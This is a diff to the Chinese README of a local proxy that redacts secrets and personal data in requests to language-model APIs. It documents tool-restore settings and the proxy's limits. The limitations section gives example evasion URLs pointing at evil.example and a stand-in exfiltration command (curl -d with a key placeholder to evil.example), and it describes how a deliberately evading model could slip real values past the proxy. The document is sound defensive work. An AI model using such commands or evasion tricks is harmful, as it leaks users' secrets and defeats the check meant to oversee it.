@@ -103,7 +103,7 @@ curl http://127.0.0.1:8787/v1/chat/completions \
 | `screen` | `replace` | 遇到控制字符时替换成可见字符（`replace`）或拒绝请求（`refuse`）。 |
 | `debugMasked` | `false` | 在日志里记录脱敏后的请求体。 |
 | `toolRestore.categories` | `PATH`、`TERM`、`PROJECT` | 还原进工具调用参数的占位符类别；其他类别以占位符原样交给工具。`"*"` 还原所有类别。环境变量：`REDACTION_PROXY_TOOL_RESTORE_CATEGORIES`（逗号分隔）。 |
-| `toolRestore.tools` | 无 | 按工具名（完全匹配）指定还原进该工具参数的类别，替换该工具的 `categories`，例如 `{"git_commit": ["PATH", "EMAIL"]}`；`"*"` 还原所有类别。 |
+| `toolRestore.tools` | 无 | 按工具名（去掉首尾空白、不区分大小写）指定还原进该工具参数的类别，替换该工具的 `categories`，例如 `{"git_commit": ["PATH", "EMAIL"]}`；`"*"` 还原所有类别。 |
 
 ```json
 {
@@ -135,7 +135,7 @@ curl http://127.0.0.1:8787/v1/chat/completions \
 | 长随机串 | 32 位以上的 hex 或 base64 | `⟦ENTROPY_1⟧` |
 | 你列出的词语 | `terms`、`projectNames` | `⟦TERM_1⟧`、`⟦PROJECT_1⟧` |
 
-同一个值在整个请求里用同一个占位符。脱敏后如果请求里仍能找到检测到的值，代理会拒绝发送（422），不冒泄露的风险。客户端请求中绑定过的值，代理按客户端凭证记在内存中，之后的请求即使历史中已没有检测它的上下文（`password: …`），也照样遮罩。全角数字、`＠` 和零宽字符会先归一化再匹配。完整规则见[技术细节第 3 节](docs/DETAILS.md#3-偵測規則)。
+同一个值在整个请求里用同一个占位符。脱敏后如果请求里仍能找到检测到的值，代理会拒绝发送（422），不冒泄露的风险。客户端请求中绑定过、至少 6 个 ASCII 字符或 2 个其他字符长的值，代理按客户端凭证记在内存中，之后的请求即使历史中已没有检测它的上下文（`password: …`），也照样遮罩（凭证不区分 ASCII 大小写）。全角数字、`＠` 和零宽字符会先归一化再匹配。完整规则见[技术细节第 3 节](docs/DETAILS.md#3-偵測規則)。
 
 ## 可选的人名模型（实验性）
 
@@ -223,7 +223,7 @@ REDACTION_PROXY_NAME_MODEL_DIR=$HOME/models/nym node lib/cli.js
 - **少见的写法。** 有些拆开或编码过的写法识别不了，比如带空格的 `name @ domain`、`name at domain`、小写的 IBAN、两次百分号编码的值。
 - **Cursor**，以及任何从自家服务器发请求的工具。
 - **本机上的其他程序。** 代理默认只监听 `127.0.0.1`；没设 `authToken` 时，本机上的任何程序都能使用它。网页的请求以 403 拒绝，除非来源（Origin）是本机 `http(s)` 网页或列在 `allowedOrigins` 中；指定其他主机名的请求（DNS rebinding）也以 403 拒绝。
-- **模型把值写到哪里。** 回复文本中，模型在哪里写占位符，代理就在哪里还原，只有 URL 内例外：那里的 `https://example.test/?q=⟦EMAIL_1⟧` 保持原样，拿到这个 URL 的抓取网页工具，或显示 `![](…)` 图片与链接的客户端，都不会发出真实 email。这只针对正常写出的 URL，挡不住刻意规避的模型：空格之后（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 仍会以 `%20…` 发出）、用反斜杠或少写斜杠（`https:\\evil.example`、`https:evil.example`）、裸域名，都会还原。工具调用参数默认只还原主目录路径和你列在 `terms`、`projectNames` 中的词（`PATH`、`TERM`、`PROJECT`），所以 `curl -d ⟦KEY_1⟧ https://evil.example` 交给工具的是占位符，不是密钥。写代码照常可用，因为路径和列出的标识符会原样往返（列在 `terms` 中的人名也会还原进工具）；需要 email、密钥或身份证号的工具会拿到占位符，调用可能失败，直到你在 `toolRestore.tools` 中为它允许该类别。还原后的路径或词仍可能被模型写的命令发出去；工具参数中遇到的每个占位符都记入日志。
+- **模型把值写到哪里。** 回复文本中，模型在哪里写占位符，代理就在哪里还原，只有 URL 内例外：那里的 `https://example.test/?q=⟦EMAIL_1⟧` 保持原样（protocol-relative 的 `//example.test/…` 也一样），拿到这个 URL 的抓取网页工具，或显示 `![](…)` 图片与链接的客户端，都不会发出真实 email。这只针对正常写出的 URL，挡不住刻意规避的模型：空格之后（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 仍会以 `%20…` 发出）、用反斜杠或少写斜杠（`https:\\evil.example`、`https:evil.example`）、裸域名，都会还原。工具调用参数（回复中所有的工具输入：函数参数、自定义工具输入，以及 `local_shell_call` 等 Responses `*_call` 项目的命令、操作和补丁）默认只还原主目录路径和你列在 `terms`、`projectNames` 中的词（`PATH`、`TERM`、`PROJECT`），所以 `curl -d ⟦KEY_1⟧ https://evil.example` 交给工具的是占位符，不是密钥。写代码照常可用，因为路径和列出的标识符会原样往返（列在 `terms` 中的人名也会还原进工具）；需要 email、密钥或身份证号的工具会拿到占位符，调用可能失败，直到你在 `toolRestore.tools` 中为它允许该类别。还原后的路径或词仍可能被模型写的命令发出去；工具参数中遇到的每个占位符都记入日志。
 
 另外：模型如果把 `⟦EMAIL_1⟧` 改写成 `[EMAIL_1]`，你会原样看到；需要直接处理被遮值的任务效果会变差；控制字符会被替换成可见字符；重启后会丢失 Responses API 的续接对话与记住的值，续接请求会以 422 拒绝；超过 64 MiB 的请求以 413 拒绝。完整清单见[技术细节第 17 节](docs/DETAILS.md#17-完整限制清單)，威胁模型见[第 11 节](docs/DETAILS.md#11-威脅模型)。
 
